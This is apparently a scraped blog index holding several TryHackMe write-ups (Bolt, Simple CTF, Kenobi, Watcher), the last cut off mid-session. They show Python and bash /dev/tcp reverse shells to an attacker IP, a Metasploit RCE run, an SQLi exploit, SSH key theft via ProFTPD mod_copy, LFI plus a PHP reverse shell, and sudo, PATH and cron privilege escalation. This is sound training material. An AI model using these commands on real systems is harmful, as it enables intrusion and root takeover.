socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'We need to set up a listener on our machine first: nc -lnvp 9001 Note: Don’t forget to change the ip address in the script to your ip address.We can now run the command and get a reverse shell.Enter OS command , for exit 'quit' : python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.11.31.131\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'We won’t get any output here, but if we go to our listener, we find that we have a shell.$ nc -lnvp 9001 1 ⨯listening on [any] 9001 ...1connect to [10.11.31.131] from (UNKNOWN) [10.10.102.179] 58452# whoami 1whoami sh: 1: 1whoami: not found # whoami whoami root # python3 -c 'import pty;pty.spawn(\"/bin/bash\")'python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@bolt:~/public/files#We are already root so that’s great.Method 2 (Metasploit)With Metasploit, things are a bit easy, we search for Bolt CMS, we select the exploit we want to use, we set the required parameters(RHOSTS, USERNAME, PASSWORD and LHOST) and we run the exploit.msf6 &gt; search Bolt CMSMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/bolt_authenticated_rce 2020-05-07 excellent Yes Bolt CMS 3.7.0 - Authenticated Remote Code Execution 1 exploit/multi/http/bolt_file_upload 2015-08-17 excellent Yes CMS Bolt File Upload VulnerabilityInteract with a module by name or index. For example info 1, use 1 or use exploit/multi/http/bolt_file_uploadmsf6 &gt; use exploit/unix/webapp/bolt_authenticated_rcemsf6 exploit(unix/webapp/bolt_authenticated_rce) &gt; set PasSWORD boltadmin123PasSWORD =&gt; boltadmin123msf6 exploit(unix/webapp/bolt_authenticated_rce) &gt; set username boltusername =&gt; boltmsf6 exploit(unix/webapp/bolt_authenticated_rce) &gt; set rhosts 10.10.144.77rhosts =&gt; 10.10.144.77msf6 exploit(unix/webapp/bolt_authenticated_rce) &gt; set lhost tun0lhost =&gt; 10.11.31.131msf6 exploit(unix/webapp/bolt_authenticated_rce) &gt; exploit[*] Started reverse TCP handler on 10.11.31.131:4444[*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable \"kfabkk\".[*] Found 3 potential token(s) for creating .php files.[+] Used token 150bbd603b7b29da72b6b60648 to create oysfcpnse.php.[*] Attempting to execute the payload via \"/files/oysfcpnse.php?kfabkk=`payload`\"[!] No response, may have executed a blocking payload![*] Command shell session 1 opened (10.11.31.131:4444 -&gt; 10.10.144.77:38544 ) at 2022-01-09 15:54:07 -0500[+] Deleted file oysfcpnse.php.[+] Reverted user profile back to original state.whoamirootAnd just like that, we have exploited the machine, no privilege escalation needed cause we are already root.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Simple CTF", "url": "/posts/SimpleCTF/", "categories": "TryHackMe", "tags": "tryhackme, linux, ftp, sqli, python, crack, sudo", "date": "2022-01-27 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Simple CTF from TryHackMe, an easy machine where we find an outdated CMS, us an exploit for that to get ssh credentials, and finally escalate to root using Vim. If you have any questions please feel free to ask me on any of my socials.EnumerationnmapAs always, we run a nmap scan:$ sudo nmap -sC -sV -p- 10.10.92.122 | tee scans/nmapStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-27 05:26 ESTNmap scan report for 10.10.92.122Host is up (0.11s latency).Not shown: 65532 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.11.31.131| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: TIMEOUT80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 2 disallowed entries|_/ /openemr-5_0_1_3|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)| 256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)|_ 256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelWe have 3 open port: 21 - FTP 80 - HTTP 2222 - SSHFTPFrom the nmap scan, we see that anonymous FTP login is allowed, so let’s take a look:$ ftp 10.10.92.122 130 ⨯Connected to 10.10.92.122.220 (vsFTPd 3.0.3)Name (10.10.92.122:sirius): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||44846|)^Creceive aborted. Waiting for remote to finish abort.ftp&gt; passivePassive mode: off; fallback to active mode: off.ftp&gt; ls200 EPRT command successful. Consider using EPSV.150 Here comes the directory listing.drwxr-xr-x 2 ftp ftp 4096 Aug 17 2019 pub226 Directory send OK.ftp&gt; cd pub250 Directory successfully changed.ftp&gt; ls200 EPRT command successful. Consider using EPSV.150 Here comes the directory listing.-rw-r--r-- 1 ftp ftp 166 Aug 17 2019 ForMitch.txt226 Directory send OK.ftp&gt; get ForMitch.txtlocal: ForMitch.txt remote: ForMitch.txt200 EPRT command successful. Consider using EPSV.150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).100% |****************************************************************************************************************| 166 1.86 MiB/s 00:00 ETA226 Transfer complete.166 bytes received in 00:00 (1.64 KiB/s)ftp&gt; NOTE: When i tried to list the content, it gave me this “229 Entering Extended Passive Mode (     44846 )” the way i solved was by typing ctrl+c and then the command passive. The file we found is a note indicating that the password is so weak and can be cracked in seconds!HTTPLet’s now check the web server and see what’s there:Nothing interesting, let’s run a directory scan using Gobuster:$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.92.122 | tee scans/gobuster===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.92.122[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/01/27 06:07:56 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 296]/.htpasswd (Status: 403) [Size: 296]/robots.txt (Status: 200) [Size: 929]/server-status (Status: 403) [Size: 300]/simple (Status: 301) [Size: 313] [--&gt; http://10.10.92.122/simple/]===============================================================We found /robots.txt file and /simple directory, robots file has nothing useful for us, and we find CMS Made Simple running on the machine, and it is displaying the version of it in the bottom left corner:We found that this version of the CMS is vulnerable to SQL injection, here is the exploit.SQLiAfter downloading the exploit, we can launch the attack with the following command:python &lt;exploit&gt;.py -u http://{target_IP}/simple/ -c -w {path/to/the/wordlist}[+] Salt for password found: 1daREDACTED6bb2[+] Username found: m___h[+] Email found: admin@admin.com[+] Password found: 0c01f4468REDACTEDc7eb73846e8d96[+] Password cracked: s_____ Note: I have masked the the data above, but if you run the exploit, you will get the username and the password.FootholdNow that we have a username and password, we can try to connect to SSHssh -p 2222 username@{target_IP}$ ssh -p 2222 m____@10.10.92.122m____@10.10.92.122's password:Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage0 packages can be updated.0 updates are security updates.Last login: Thu Jan 27 13:58:57 2022 from 10.11.31.131$ lsuser.txtGreat, we got access to the machine via SSH, let’s do some enumeration to see what can we find:$ sudo -lUser m___h may run the following commands on Machine: (root) NOPASSWD: /usr/bin/vimPrivilege EscalationWith our current user, we can run vim as root, this is great, if we go to GTFPBins we can see that there is a way to escalate our privileges to root using this command: sudo vim -c ':!/bin/bash' , so let’s do it:$ sudo vim -c ':!/bin/bash'root@Machine:~# iduid=0(root) gid=0(root) groups=0(root)root@Machine:~# ls /rootroot.txtAnd just like that, we got root on the machine.I hope you guys have enjoyed this machine, see you in the next hack." }, { "title": "TryHackMe - Kenobi", "url": "/posts/Kenobi/", "categories": "TryHackMe", "tags": "tryhackme, linux, smb, nfs, ftp", "date": "2022-01-21 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Kenobi from TryHackMe. It is a walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.EnumerationnmapAs always, let’s start our enumeration with an nmap scan:$ sudo nmap -sC -sV -T4 {target_IP}Starting Nmap 7.92 ( https://nmap.org ) at 07:47 ESTNmap scan report for 10.10.229.106Host is up (0.10s latency).Not shown: 993 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.522/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)| 256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)|_ 256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry|_/admin.html|_http-title: Site doesn't have a title (text/html).111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/tcp6 nfs| 100003 2,3,4 2049/udp nfs| 100003 2,3,4 2049/udp6 nfs| 100005 1,2,3 34621/tcp6 mountd| 100005 1,2,3 37632/udp mountd| 100005 1,2,3 43517/udp6 mountd| 100005 1,2,3 48109/tcp mountd| 100021 1,3,4 34141/udp6 nlockmgr| 100021 1,3,4 36260/udp nlockmgr| 100021 1,3,4 36783/tcp nlockmgr| 100021 1,3,4 43687/tcp6 nlockmgr| 100227 2,3 2049/tcp nfs_acl| 100227 2,3 2049/tcp6 nfs_acl| 100227 2,3 2049/udp nfs_acl|_ 100227 2,3 2049/udp6 nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open nfs_acl 2-3 (RPC #100227)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h42m38s, deviation: 3h27m50s, median: -17m21s| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-time:| date: T12:30:39|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required| smb-os-discovery:| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: kenobi| NetBIOS computer name: KENOBI\\x00| Domain name: \\x00| FQDN: kenobi|_ System time: T06:30:38-06:00Nmap found 7 open ports: 21/tcp - FTP - (ProFTPD 1.3.5) 22/tcp - SSH - (OpenSSH 7.2.p2) 80/tcp - HTTP - (Apache httpd 2.4.18) 111/tcp - RPC - (rpcbind, NFS access) 139/tcp - Samba 445/tcp - Samba 2049/tcp - nfs_aclWebWe don’t have any credentials for FTP and SSH, so let’s enumerate the HTTP server:Nothing interesting here, even the source code. Let’s try to do a directory scan using Gobuster:$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.229.106[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s=============================================================== 08:57:12 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 278]/.htaccess (Status: 403) [Size: 278]/.htpasswd (Status: 403) [Size: 278]/index.html (Status: 200) [Size: 200]/robots.txt (Status: 200) [Size: 36]/server-status (Status: 403) [Size: 278]===============================================================Gobuster found robots.txt, let’s check it out:Let’s see what’s on /admin.html:Well, we got nothing useful, it’s just a rabbit hole.SMBLet’s now enumerate Samba for any SMB shares, i will be using enum4linux:$ enum4linux -S {target_IP} ==========================| Target Information | ==========================Target ........... 10.10.229.106RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none =====================================================| Enumerating Workgroup/Domain on 10.10.229.106 | =====================================================[+] Got domain/workgroup name: WORKGROUP ======================================| Session Check on 10.10.229.106 | ======================================[+] Server 10.10.229.106 allows sessions using username '', password '' ==========================================| Share Enumeration on 10.10.229.106 | ==========================================\tSharename Type Comment\t--------- ---- -------\tprint$ Disk Printer Drivers\tanonymous Disk \tIPC$ IPC IPC Service (kenobi server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing.\tServer Comment\t--------- -------\tKENOBI kenobi server (Samba, Ubuntu)\tWorkgroup Master\t--------- -------\tWORKGROUP KENOBIWe found 3 SMB shares, let’s see what on the anonymous share:$ smbclient //10.10.229.106/anonymouslpcfg_do_global_parameter: WARNING: The \"client use spnego\" option is deprecatedlpcfg_do_global_parameter: WARNING: The \"client ntlmv2 auth\" option is deprecatedEnter WORKGROUP\\sirius's password:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Wed Sep 4 06:49:09 2019 .. D 0 Wed Sep 4 06:56:07 2019 log.txt N 12237 Wed Sep 4 06:49:09 2019 9204224 blocks of size 1024. 6877100 blocks availablesmb: \\&gt; get log.txtgetting file \\log.txt of size 12237 as log.txt (27.6 KiloBytes/sec) (average 27.6 KiloBytes/sec)smb: \\&gt; Note: submit the password as nothing.We found a file called log.txt, we cant use the command get to download the file to our machine. The file has some information about a public/private ssh keys being generated and saved in /home/kenobi/.ssh/, let’s keep that on mind and continue our enumeration.NFSWe can enumerate the NFS service for mounts using this command : showmount -e {target_IP}$ showmount -e 10.10.208.106 Export list for 10.10.208.106:/var *We found a mount called /var. We can use the mount command to connect to the NFS share to a mount point on our machine: sudo mount -t nfs {target_IP}:/var /tmp/kenobi -nolock.┌──(sirius㉿kali)-[~]└─$ cd /tmp/kenobi ┌──(sirius㉿kali)-[/tmp/kenobi]└─$ lsbackups cache crash lib local lock log mail opt run snap spool tmp wwwJust like that, we got a copy of everything on the /var mount on our machine.FTPWhen we search for proftpd 1.3.5 using searchsploit, the output shows an exploit from ProFtpd’s mod_copy module. The mod_copy module actualizes SITE CPFR and SITE CPTO commands, which can be utilized to copy files/directories from one place to another on the server. Let’s use that to copy the private key we saw earlier in log.txt to the /var directory that we know it’s the mount we have connected to earlier. The commands we will be using are: nc {target_IP} 21 : to connect to the FTP server. SITE CPFR {source-path} : i think it means ‘copy from’ SITE CPTO {destination-path} : i think it means and ‘copy to’┌──(sirius㉿kali)-[~]└─$ nc 10.10.208.106 21220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.208.106]SITE CPFR /home/kenobi/.ssh/id_rsa350 File or directory exists, ready for destination nameSITE CPTO /var/tmp/id_rsa250 Copy successful^C┌──(sirius㉿kali)-[~]└─$ ls /tmp/kenobi/tmp 1 ⨯id_rsasystemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktMsystemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Awsystemd-private-de6ab464c3a449188c59cc9ac254b25b-systemd-timesyncd.service-E5AyCZsystemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdnGreat, we have successfully copied the private key to the NFS mount.FootholdWe will be using the private key (id_rsa) to login to Kenobi’s account using ssh. But first, we need to copy it to our machine and give it the right permissions in order for it to work. cd ~/ ; cp /tmp/kenobi/tmp/id_rsa . chmod 600 id_rsa ssh -i id_rsa kenobi@{target_IP} ┌──(sirius㉿kali)-[~]└─$ cp /tmp/kenobi/tmp/id_rsa .┌──(sirius㉿kali)-[~]└─$ chmod 600 id_rsa ┌──(sirius㉿kali)-[~]└─$ ssh -i id_rsa kenobi@10.10.208.106The authenticity of host '10.10.208.106 (10.10.208.106)' can't be established.ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.208.106' (ED25519) to the list of known hosts.Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage103 packages can be updated.65 updates are security updates.Last login: Wed Sep 4 07:10:15 2019 from 192.168.1.147To run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.kenobi@kenobi:~$ lsshare user.txtGreat, we are now on the machine as kenobi.Privilege EscalationLet’s now try to escalate our privileges and become root. We need to look for some SUID binaries.kenobi@kenobi:~$ find / -type f -perm -04000 2&gt;/dev/null /sbin/mount.nfs /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/bin/chfn /usr/bin/newgidmap /usr/bin/pkexec /usr/bin/passwd /usr/bin/newuidmap /usr/bin/gpasswd /usr/bin/menu /usr/bin/sudo /usr/bin/chsh /usr/bin/at /usr/bin/newgrp /bin/umount /bin/fusermount /bin/mount /bin/ping /bin/su /bin/ping6We find a weird binary called menu, when we run it, it gives us 3 choices to choose from.kenobi@kenobi:~$ menu***************************************1. status check2. kernel version3. ifconfig** Enter your choice :If we choose 3 for example, we get the output of the ifconfig command:kenobi@kenobi:~# menu***************************************1. status check2. kernel version3. ifconfig** Enter your choice :3eth0 Link encap:Ethernet HWaddr 02:fb:d0:58:9d:73 inet addr:10.10.208.106 Bcast:10.10.255.255 Mask:255.255.0.0 inet6 addr: fe80::fb:d0ff:fe58:9d73/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:9001 Metric:1 RX packets:2187 errors:0 dropped:0 overruns:0 frame:0 TX packets:1861 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:269505 (269.5 KB) TX bytes:359038 (359.0 KB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:232 errors:0 dropped:0 overruns:0 frame:0 TX packets:232 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:16160 (16.1 KB) TX bytes:16160 (16.1 KB)With that, we can try to create our own ifconfig binary that will run /bin/bash command once called by menu, we need to put it in the /tmp directory, give it the execute permission and add the /tmp directory to the PATH variable.kenobi@kenobi:~$ echo '/bin/bash' &gt; /tmp/ifconfigkenobi@kenobi:~$ chmod +x /tmp/ifconfigkenobi@kenobi:~$ export PATH=/tmp:$PATHNow if we run menuwith choice 3, we should have root:kenobi@kenobi:~$ menu***************************************1. status check2. kernel version3. ifconfig** Enter your choice :3To run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.root@kenobi:~# ls /rootroot.txtWe got root! And just like that, we have PWNed Kenobi. Hope you guys enjoyed it, and see you in the next hack." }, { "title": "TryHackMe - Watcher", "url": "/posts/Watcher/", "categories": "TryHackMe", "tags": "tryhackme, linux, privesc, web, cronjob, ftp, gobuster, python, lfi", "date": "2022-01-17 01:00:00 +0100", "snippet": " Hello l33ts, I hope you are doing well. Today we are going to look at Watcher from TryHackMe, a medium machine requires the exploitation of an LFI vulnerability to get some credentials, and use those credentials to upload a web reverse shell in order to get access to the machine, and work from there to get root with multiple horizontal Privilege escalation using different techniques. Let’s dive into it.DescriptionA boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.EnumerationLet’s start our enumeration with a nmap scan:sudo nmap -sC -sV -T4 {target_IP} | tee scans/nmap -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. | tee scans/nmap: Save the output to a file named nmap. nmap $ sudo nmap -sC -sV {target-IP} | tee scans/nmap Starting Nmap 7.92 ( https://nmap.org ) at 06:04 ESTNmap scan report for 10.10.18.205Host is up (0.096s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)| 256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)|_ 256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: Jekyll v4.1.1|_http-title: Corkplacemats|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.99 seconds We find 3 open ports, 21(FTP), 22(SSH) and 80(HTTP). We don’t have credentials for FTP nor for SSH, so let’s enumerate the HTTP server using Gobuster:$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP} | tee scans/gobuster===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.18.205[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================06:07:15 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/css (Status: 301) [Size: 310] [--&gt; http://10.10.18.205/css/]/images (Status: 301) [Size: 313] [--&gt; http://10.10.18.205/images/]/index.php (Status: 200) [Size: 4826] /robots.txt (Status: 200) [Size: 69] /server-status (Status: 403) [Size: 277] ===============================================================Gobuster found robots.txt, let’s check it.Flag 1Great we found our first flag, we can find it here : http://{target_IP}/flag_1.txt. We also found another file, but we don’t have access to it.Let’s check if the website has anything useful for us:If we click one of the pictures on the website we get redirected to /post.php where we can see a parameter query /post.php?post=round.php. Let’s see if this parameter is vulnerable to LFI:Great, it is vulnerable to LFI, let’s now try to pull the file we found earlier in robots.txt:We have manged to read that file, and it seems we have got some FTP credentials that we can use.FTPLet’s login to FTP and see what’s there: ftp {target_IP}Flag 2┌──(sirius㉿kali)-[~/CTF/THM/watcher] └─$ ftp 10.10.18.205 Connected to 10.10.18.205. 220 (vsFTPd 3.0.3) Name (10.10.18.205:sirius): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls 229 Entering Extended Passive Mode (|||43157|) 150 Here comes the directory listing. drwxr-xr-x 2 1001 1001 4096 Dec 03 2020 files -rw-r--r-- 1 0 0 21 Dec 03 2020 flag_2.txt 226 Directory send OK. ftp&gt; get flag_2.txt local: flag_2.txt remote: flag_2.txt 229 Entering Extended Passive Mode (|||47137|) 150 Opening BINARY mode data connection for flag_2.txt (21 bytes). 100% |****************************************************************************************************************| 21 113.30 KiB/s 00:00 ETA226 Transfer complete. 21 bytes received in 00:00 (0.21 KiB/s) dftp&gt;exit221 Goodbye.┌──(sirius㉿kali)-[~/CTF/THM/watcher] └─$ ls flag_2.txt scansGreat, we found our second flag, we can copy it to our machine using : get flag_2.txtSince we have an LFI vulnerability, i’m going to try to upload a php reverse shell to the FTP server and try to access it using the web server. The shell i will be using is this : php_reverse_shell$ ftp 10.10.18.205 Connected to 10.10.18.205. 220 (vsFTPd 3.0.3) Name (10.10.18.205:sirius): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; put rev.php local: rev.php remote: rev.php 229 Entering Extended Passive Mode (|||45312|) 553 Could not create file. ftp&gt; pwd Remote directory: / ftp&gt; ls 229 Entering Extended Passive Mode (|||42555|) 150 Here comes the directory listing. drwxr-xr-x 2 1001 1001 4096 Dec 03 2020 files -rw-r--r-- 1 0 0 21 Dec 03 2020 flag_2.txt 226 Directory send OK. ftp&gt; cd files 250 Directory successfully changed. ftp&gt; put rev.php local: rev.php remote: rev.php 229 Entering Extended Passive Mode (|||41911|) 150 Ok to send data. 100% |****************************************************************************************************************| 3651 23.84 MiB/s 00:00 ETA226 Transfer complete. 3651 bytes sent in 00:00 (15.91 KiB/s) ftp&gt; ls 229 Entering Extended Passive Mode (|||46255|) 150 Here comes the directory listing. -rw-r--r-- 1 1001 1001 3651 Jan 13 10:57 rev.php 226 Directory send OK. ftp&gt;I couldn’t upload it first in the root directory but i managed to upload it into files directory. Note : you should change the ip in the reverse shell before uploading it.Now, we should set up a listener in our machine before navigating to the shell.nc -lnvp 1234According to the secret file we found in robots.txt:The path to our reverse shell is /home/ftpuser/ftp/files/. So in order to execute the script, we need to navigate to http://{target_IP}/post.php?post=/home/ftpuser/ftp/files/rev.php Note : ‘rev.php’ is what i named my reverse shell file, yours might be different!!!FootholdAfter setting up everything and navigating to our shell, we should get a reverse shell: $ nc -lnvp 1234 [142/144]listening on [any] 1234 ... connect to [10.11.31.131] from (UNKNOWN) [10.10.18.205] 36444 Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 10:58:02 up 19 min, 0 users, load average: 0.00, 0.02, 0.11 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@watcher:/home$ export TERM=xterm export TERM=xtermwww-data@watcher:/home$ ^Zzsh: suspended nc -lnvp 1234┌──(sirius㉿kali)-[~]└─$ stty raw -echo; fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 1234www-data@watcher:/home$Flag 3Great, we got a shell, i have executed some commands to get a functional shell: [target machine] python3 -c 'import pty;pty.spawn(\"/bin/bash\")' [target machine] export TERM=xterm [target machine] ctrl+z [attacker machine] stty raw -echo;fgWe can find our third flag here: www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls flag_3.txtPrivilege EscalationFlag 4It’s now to upgrade from www-data to another user, let’s check what we can do with our current user:www-data@watcher:/$ sudo -lMatching Defaults entries for www-data on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on watcher: (toby) NOPASSWD: ALLApparently, we can execute any command as toby. We can use that to change our user to toby:www-data@watcher:/$ sudo -u toby /bin/bashtoby@watcher:/$toby@watcher:/$ lsflag_4.txt jobs note.txttoby@watcher:~$ cat note.txt Hi Toby,I've got the cron jobs set up now so don't worry about getting that done.With that, we can now cat the fourth flag.Flag 5We have a note from someone that says there is a cronjob set up, let’s see what’s there:toby@watcher:/$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )#*/1 * * * * mat /home/toby/jobs/cow.shThere a script called cow.sh that runs as mat but we as toby are the owner of that file, so we can edit it to get a shell as mat. I added a bash script to cow.sh that sends me a reverse shell, the script now looks like this:$ cat cow.sh#!/bin/bashcp /home/mat/cow.jpg /tmp/cow.jpg/bin/bash -i &gt;&amp; /dev/tcp/{attacker_IP}/9001 0&gt;&amp;1Set up a listner on port 9001 and wait.┌──(sirius㉿kali)-[~] [35/36]└─$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.11.31.131] from (UNKNOWN) [10.10.18.205] 39298 bash: cannot set terminal process group (2119): Inappropriate ioctl for device bash: no job control in this shell 